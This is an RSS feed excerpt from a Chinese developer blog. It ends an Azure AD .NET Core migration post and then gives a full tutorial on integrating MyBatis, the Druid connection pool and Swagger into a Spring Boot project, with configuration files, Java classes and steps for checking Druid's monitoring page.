&lt;p&gt;移植到 .NET Core 后，我们的服务吞吐量增加了一倍，这是一个伟大的决定，并且我们的 .NET Core 之旅不会停止。对于未来，我们正在考虑：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;升级到 .NET 5.0 以进一步提高性能。&lt;/li&gt;
&lt;li&gt;移植到 Kestrel，以便我们能够在 TLS 层拦截连接，以获得更好的弹性。&lt;/li&gt;
&lt;li&gt;在我们自己的反向代理中使用 &lt;a href=&quot;https://microsoft.github.io/reverse-proxy/&quot; target=&quot;_blank&quot;&gt;YARP&lt;/a&gt; 的组件和最佳实践，同时也做出回馈。&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;</description>
<pubDate>Tue, 19 Jan 2021 00:17:00 +0000</pubDate>
<dc:creator>Rwing</dc:creator>
<og:description>Azure Active Directory 的网关服务是一个反向代理，它为构成 Azure AD 的数百个服务提供前置服务。如果你使用过 office.com、outlook.com、azure.c</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Rwing/p/azure-active-directorys-gateway-service-is-on-net-core-3-1.html</dc:identifier>
</item>
<item>
<title>MyBatis初级实战之三：springboot集成druid - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/14296129.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/14296129.html</guid>
<description>&lt;p&gt;OpenWrite版：&lt;/p&gt;
&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;p&gt;本文是《MyBatis初级实战》系列的第三篇，我们将实战springboot、mybatis、druid的集成，并验证；&lt;/p&gt;
&lt;h3 id=&quot;关于druid&quot;&gt;关于druid&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;Druid是数据库连接池，并且能够提供强大的监控和扩展功能；&lt;/li&gt;
&lt;li&gt;官方GitHub地址：&lt;a href=&quot;https://github.com/alibaba/druid&quot; target=&quot;_blank&quot;&gt;https://github.com/alibaba/druid&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;本次集成使用了durid官方的starter，名为&lt;span&gt;druid-spring-boot-starter&lt;/span&gt;，版本&lt;span&gt;1.1.17&lt;/span&gt;，对应druid版本是&lt;span&gt;1.1.17&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;本篇概览&quot;&gt;本篇概览&lt;/h3&gt;
&lt;p&gt;本文由以下内容组成：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;新建springboot工程，里面有详细的集成druid的操作；&lt;/li&gt;
&lt;li&gt;编写和执行单元测试代码，并规避一个由集成druid带来的问题；&lt;/li&gt;
&lt;li&gt;启动springboot应用，通过swagger验证基本功能正常；&lt;/li&gt;
&lt;li&gt;通过断点，确认使用了druid连接池；&lt;/li&gt;
&lt;li&gt;体验druid提供的监控页面；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;源码下载&quot;&gt;源码下载&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;如果您不想编码，可以在GitHub下载所有源码，地址和链接信息如下表所示(&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;)：&lt;/li&gt;
&lt;/ol&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;这个git项目中有多个文件夹，本章的应用在&lt;span&gt;mybatis&lt;/span&gt;文件夹下，如下图红框所示：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119074957252-1685426587.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;springbootmybatisdruidswagger集成步骤小结&quot;&gt;springboot+mybatis+druid+swagger集成步骤小结&lt;/h3&gt;
&lt;p&gt;将整个集成所需步骤列举如下，避免遗漏：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;创建springboot工程；&lt;/li&gt;
&lt;li&gt;pom.xml中加入mybaits、druid、swagger依赖；&lt;/li&gt;
&lt;li&gt;配置mybatis-config.xml；&lt;/li&gt;
&lt;li&gt;配置application.yml，里面有数据源、mybatis、druid；&lt;/li&gt;
&lt;li&gt;springboot启动类，指定MapperScan；&lt;/li&gt;
&lt;li&gt;swagger配置类；&lt;/li&gt;
&lt;li&gt;druid配置类；&lt;/li&gt;
&lt;li&gt;数据库实体类；&lt;/li&gt;
&lt;li&gt;mybatis的mapper配置文件；&lt;/li&gt;
&lt;li&gt;mybatis的mapper类；&lt;/li&gt;
&lt;li&gt;业务代码；&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;后续按照上述清单进行开发即可；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;开发&quot;&gt;开发&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;本文的实战使用的数据库和表结构与&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/107805840&quot; target=&quot;_blank&quot;&gt;《MyBatis初级实战之一：Spring Boot集成》&lt;/a&gt;一模一样；&lt;/li&gt;
&lt;li&gt;前文&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/107805840&quot; target=&quot;_blank&quot;&gt;《MyBatis初级实战之一：Spring Boot集成》&lt;/a&gt;创建了父工程mybatis，本文继续在此工程中新增子工程，名为&lt;span&gt;druidonesource&lt;/span&gt;，整个子工程文件结构如下：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119074957675-1467233884.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 在父工程中添加druid的版本管理：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;druid-spring-boot-starter&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;1.1.17&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;新工程druidonesource的pom.xml内容如下：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
    &amp;lt;parent&amp;gt;
        &amp;lt;groupId&amp;gt;com.bolingcavalry&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;mybatis&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;
        &amp;lt;relativePath&amp;gt;../pom.xml&amp;lt;/relativePath&amp;gt;
    &amp;lt;/parent&amp;gt;

    &amp;lt;groupId&amp;gt;com.bolingcavalry&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;druidonesource&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
    &amp;lt;name&amp;gt;druidonesource&amp;lt;/name&amp;gt;
    &amp;lt;description&amp;gt;Demo project for Mybatis Druid (one datasource) in Spring Boot&amp;lt;/description&amp;gt;

    &amp;lt;properties&amp;gt;
        &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;
    &amp;lt;/properties&amp;gt;

    &amp;lt;dependencies&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.mybatis.spring.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;mybatis-spring-boot-starter&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;mysql&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;mysql-connector-java&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;runtime&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
            &amp;lt;exclusions&amp;gt;
                &amp;lt;exclusion&amp;gt;
                    &amp;lt;groupId&amp;gt;org.junit.vintage&amp;lt;/groupId&amp;gt;
                    &amp;lt;artifactId&amp;gt;junit-vintage-engine&amp;lt;/artifactId&amp;gt;
                &amp;lt;/exclusion&amp;gt;
            &amp;lt;/exclusions&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;springfox-swagger2&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;!-- swagger-ui --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;springfox-swagger-ui&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;druid-spring-boot-starter&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;junit&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;junit&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;com.google.code.gson&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;gson&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;
    &amp;lt;/dependencies&amp;gt;

    &amp;lt;build&amp;gt;
        &amp;lt;plugins&amp;gt;
            &amp;lt;plugin&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
            &amp;lt;/plugin&amp;gt;
        &amp;lt;/plugins&amp;gt;
    &amp;lt;/build&amp;gt;

&amp;lt;/project&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;新建mybatis-config.xml：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!DOCTYPE configuration
        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&amp;gt;
&amp;lt;configuration&amp;gt;
    &amp;lt;typeAliases&amp;gt;
        &amp;lt;!-- 映射文件中的类不用写全路径了--&amp;gt;
        &amp;lt;package name=&quot;com.bolingcavalry.druidonesource.entity&quot;/&amp;gt;
    &amp;lt;/typeAliases&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;配置application.yml，请重点关注druid的配置，还请注意&lt;span&gt;stat-view-servlet&lt;/span&gt;，这里是druid监控页面的登录配置：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-yml&quot;&gt;server:
  port: 8080

spring:
  #1.JDBC数据源
  datasource:
    username: root
    password: 123456
    url: jdbc:mysql://192.168.50.43:3306/mybatis?useUnicode=true&amp;amp;characterEncoding=utf-8&amp;amp;useSSL=true&amp;amp;serverTimezone=UTC
    driver-class-name: com.mysql.cj.jdbc.Driver
    #2.连接池配置
    druid:
      #初始化连接池的连接数量 大小，最小，最大
      initial-size: 5
      min-idle: 5
      max-active: 20
      #配置获取连接等待超时的时间
      max-wait: 60000
      #配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒
      time-between-eviction-runs-millis: 60000
      # 配置一个连接在池中最小生存的时间，单位是毫秒
      min-evictable-idle-time-millis: 30000
      # 配置一个连接在池中最大生存的时间，单位是毫秒
      max-evictable-idle-time-millis: 300000
      validation-query: SELECT 1 FROM user
      test-while-idle: true
      test-on-borrow: true
      test-on-return: false
      # 是否缓存preparedStatement，也就是PSCache  官方建议MySQL下建议关闭   个人建议如果想用SQL防火墙 建议打开
      pool-prepared-statements: true
      max-pool-prepared-statement-per-connection-size: 20
      # 配置监控统计拦截的filters，去掉后监控界面sql无法统计，'wall'用于防火墙
      filters: stat,wall,slf4j
      filter:
        stat:
          merge-sql: true
          slow-sql-millis: 5000
      #3.基础监控配置
      web-stat-filter:
        enabled: true
        url-pattern: /*
        #设置不统计哪些URL
        exclusions: &quot;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&quot;
        session-stat-enable: true
        session-stat-max-count: 100
      stat-view-servlet:
        enabled: true
        url-pattern: /druid/*
        reset-enable: true
        #设置监控页面的登录名和密码
        login-username: admin
        login-password: admin
        allow: 127.0.0.1
        #deny: 192.168.1.100

# mybatis配置
mybatis:
  # 配置文件所在位置
  config-location: classpath:mybatis-config.xml
  # 映射文件所在位置
  mapper-locations: classpath:mappers/*Mapper.xml

# 日志配置
logging:
  level:
    root: INFO
    com:
      bolingcavalry:
        druidonesource:
          mapper: debug
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;创建启动类，要带上&lt;span&gt;MapperScan&lt;/span&gt;注解：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.bolingcavalry.druidonesource;

import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
@MapperScan(&quot;com.bolingcavalry.druidonesource.mapper&quot;)
public class DuridOneSourceApplication {

    public static void main(String[] args) {
        SpringApplication.run(DuridOneSourceApplication.class, args);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;8&quot;&gt;&lt;li&gt;创建swagger配置类：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.bolingcavalry.druidonesource;

import springfox.documentation.service.Contact;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.service.Tag;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

/**
 * @Description: swagger配置类
 * @author: willzhao E-mail: zq2599@gmail.com
 * @date: 2020/8/11 7:54
 */
@Configuration
@EnableSwagger2
public class SwaggerConfig {

    @Bean
    public Docket createRestApi() {
        return new Docket(DocumentationType.SWAGGER_2)
                .apiInfo(apiInfo())
                .tags(new Tag(&quot;UserController&quot;, &quot;用户服务&quot;), new Tag(&quot;LogController&quot;, &quot;日志服务&quot;))
                .select()
                // 当前包路径
                .apis(RequestHandlerSelectors.basePackage(&quot;com.bolingcavalry.druidonesource.controller&quot;))
                .paths(PathSelectors.any())
                .build();
    }

    //构建 api文档的详细信息函数,注意这里的注解引用的是哪个
    private ApiInfo apiInfo() {
        return new ApiInfoBuilder()
                //页面标题
                .title(&quot;MyBatis CURD操作&quot;)
                //创建人
                .contact(new Contact(&quot;程序员欣宸&quot;, &quot;https://github.com/zq2599/blog_demos&quot;, &quot;zq2599@gmail.com&quot;))
                //版本号
                .version(&quot;1.0&quot;)
                //描述
                .description(&quot;API 描述&quot;)
                .build();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;9&quot;&gt;&lt;li&gt;创建druid配置类，如下，可见是通过使用&lt;span&gt;application.yml&lt;/span&gt;中配置的参数对&lt;span&gt;DruidDataSource&lt;/span&gt;进行配置：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.bolingcavalry.druidonesource;

import com.alibaba.druid.pool.DruidDataSource;
import com.alibaba.druid.support.http.StatViewServlet;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.web.servlet.ServletRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * @Description: druid配置类
 * @author: willzhao E-mail: zq2599@gmail.com
 * @date: 2020/8/18 08:12
 */
@Configuration
public class DruidConfig {

    private static final Logger logger = LoggerFactory.getLogger(DruidConfig.class);

    @Value(&quot;${spring.datasource.url}&quot;)
    private String dbUrl;
    @Value(&quot;${spring.datasource.username}&quot;)
    private String username;
    @Value(&quot;${spring.datasource.password}&quot;)
    private String password;
    @Value(&quot;${spring.datasource.driver-class-name}&quot;)
    private String driverClassName;
    @Value(&quot;${spring.datasource.druid.initial-size}&quot;)
    private int initialSize;
    @Value(&quot;${spring.datasource.druid.max-active}&quot;)
    private int maxActive;
    @Value(&quot;${spring.datasource.druid.min-idle}&quot;)
    private int minIdle;
    @Value(&quot;${spring.datasource.druid.max-wait}&quot;)
    private int maxWait;
    @Value(&quot;${spring.datasource.druid.pool-prepared-statements}&quot;)
    private boolean poolPreparedStatements;
    @Value(&quot;${spring.datasource.druid.max-pool-prepared-statement-per-connection-size}&quot;)
    private int maxPoolPreparedStatementPerConnectionSize;
    @Value(&quot;${spring.datasource.druid.time-between-eviction-runs-millis}&quot;)
    private int timeBetweenEvictionRunsMillis;
    @Value(&quot;${spring.datasource.druid.min-evictable-idle-time-millis}&quot;)
    private int minEvictableIdleTimeMillis;
    @Value(&quot;${spring.datasource.druid.max-evictable-idle-time-millis}&quot;)
    private int maxEvictableIdleTimeMillis;
    @Value(&quot;${spring.datasource.druid.validation-query}&quot;)
    private String validationQuery;
    @Value(&quot;${spring.datasource.druid.test-while-idle}&quot;)
    private boolean testWhileIdle;
    @Value(&quot;${spring.datasource.druid.test-on-borrow}&quot;)
    private boolean testOnBorrow;
    @Value(&quot;${spring.datasource.druid.test-on-return}&quot;)
    private boolean testOnReturn;
    @Value(&quot;${spring.datasource.druid.filters}&quot;)
    private String filters;
    @Value(&quot;{spring.datasource.druid.connection-properties}&quot;)
    private String connectionProperties;

    /**
     * Druid 连接池配置
     */
    @Bean
    public DruidDataSource dataSource() {
        DruidDataSource datasource = new DruidDataSource();
        datasource.setUrl(dbUrl);
        datasource.setUsername(username);
        datasource.setPassword(password);
        datasource.setDriverClassName(driverClassName);
        datasource.setInitialSize(initialSize);
        datasource.setMinIdle(minIdle);
        datasource.setMaxActive(maxActive);
        datasource.setMaxWait(maxWait);
        datasource.setTimeBetweenEvictionRunsMillis(timeBetweenEvictionRunsMillis);
        datasource.setMinEvictableIdleTimeMillis(minEvictableIdleTimeMillis);
        datasource.setMaxEvictableIdleTimeMillis(minEvictableIdleTimeMillis);
        datasource.setValidationQuery(validationQuery);
        datasource.setTestWhileIdle(testWhileIdle);
        datasource.setTestOnBorrow(testOnBorrow);
        datasource.setTestOnReturn(testOnReturn);
        datasource.setPoolPreparedStatements(poolPreparedStatements);
        datasource.setMaxPoolPreparedStatementPerConnectionSize(maxPoolPreparedStatementPerConnectionSize);
        try {
            datasource.setFilters(filters);
        } catch (Exception e) {
            logger.error(&quot;druid configuration initialization filter&quot;, e);
        }
        datasource.setConnectionProperties(connectionProperties);
        return datasource;
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;10&quot;&gt;&lt;li&gt;接下来的数据实体类、mapper配置、mapper接口类、业务代码等，除了package不一样，其他的与上一章&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/107971293&quot; target=&quot;_blank&quot;&gt;《MyBatis初级实战之二：增删改查》&lt;/a&gt;一模一样，请参考github源码或者上一篇文章来编写，这里就不占篇幅了；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;单元测试（特别注意）&quot;&gt;单元测试（特别注意）&lt;/h3&gt;
&lt;p&gt;单元测试时有个问题要特别注意，就是关闭监控功能，否则会导致单元测试失败；&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;新建名为application-test.yml的文件，内容和application.yml一样，仅下图红框中的值不同：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119074958028-610952898.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;单元测试类&lt;span&gt;UserControllerTest&lt;/span&gt;的内容与上一章&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/107971293&quot; target=&quot;_blank&quot;&gt;《MyBatis初级实战之二：增删改查》&lt;/a&gt;一样，仅下图红框位置是新增的，用于指定使用&lt;span&gt;application-test.yml&lt;/span&gt;配置文件:&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119074958412-425535942.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;验证，单元测试&quot;&gt;验证，单元测试&lt;/h3&gt;
&lt;p&gt;如下图红框的操作，即可完成单元测试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075000204-329086645.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;验证，swagger&quot;&gt;验证，swagger&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;运行DuridOneSourceApplication类启动应用；&lt;/li&gt;
&lt;li&gt;浏览器打开：&lt;a href=&quot;http://localhost:8080/swagger-ui.htm%EF%BC%8C%E6%93%8D%E4%BD%9C%E5%A6%82%E4%B8%8B%EF%BC%9A&quot; target=&quot;_blank&quot;&gt;http://localhost:8080/swagger-ui.htm，操作如下：&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075000645-804550934.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 得到响应操作成功，并返回了主键ID：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075000852-1663964850.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;其他接口也可以通过类似操作在swagger页面上完成；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;确认使用了druid连接池&quot;&gt;确认使用了druid连接池&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;上面的操作证明咱们的spring boot应用可以操作数据库，但没办法证明用的是druid数据源（没准用的还是spring boot的默认datasource），因此需要有种更直接的方式来检查数据源详情，因此采用了打断点的手段，查看数据源实例；&lt;/li&gt;
&lt;li&gt;给&lt;span&gt;UserMapper&lt;/span&gt;接口&lt;span&gt;insertWithFields&lt;/span&gt;方法的打上断点，如下图红框：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075001026-107206399.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 如下图，在&lt;span&gt;DuridOneSourceApplication&lt;/span&gt;类上点击鼠标右键，选择红框中的选项，即可以debug的方式启动应用：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075001746-930129139.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;4. 启动日志如下图红框，可见debug模式下启动速度很慢，请耐心等待：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075002290-267763730.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;5. 再次调用方法就会进入断点位置，这时候可以展开UserMapper对应实例的变量，如下图红框所示，可以确定使用了druid的连接池：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075002802-1107287721.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;6. 上一篇文章中的工程&lt;span&gt;curd&lt;/span&gt;没有使用druid，咱们也打上断点看看数据源啥样的，如下图所示，是个&lt;span&gt;HikariDataSource&lt;/span&gt;实例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075003303-135054555.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;体验druid提供的监控页面&quot;&gt;体验druid提供的监控页面&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;执行DuridOneSourceApplication类启动应用；&lt;/li&gt;
&lt;li&gt;浏览器访问：&lt;a href=&quot;http://localhost:8080/druid&quot; target=&quot;_blank&quot;&gt;http://localhost:8080/druid&lt;/a&gt; ，如下图，账号密码都是admin（在application.yml中配置的）：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075003546-1167647490.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;在swagger上调用几次接口对数据库进行操作，之后回到druid页面，如下图，可见已经监控到了具体的数据库操作：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210119075004038-1175264827.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;至此，springboot+mybatis+druid集成的开发和验证就完成了，希望本文能给您一些参考；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;你不孤单，欣宸原创一路相伴&quot;&gt;你不孤单，欣宸原创一路相伴&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105068742&quot; target=&quot;_blank&quot;&gt;Java系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086498&quot; target=&quot;_blank&quot;&gt;Spring系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086732&quot; target=&quot;_blank&quot;&gt;Docker系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086794&quot; target=&quot;_blank&quot;&gt;kubernetes系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086850&quot; target=&quot;_blank&quot;&gt;数据库+中间件系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086920&quot; target=&quot;_blank&quot;&gt;DevOps系列&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Mon, 18 Jan 2021 23:50:00 +0000</pubDate>
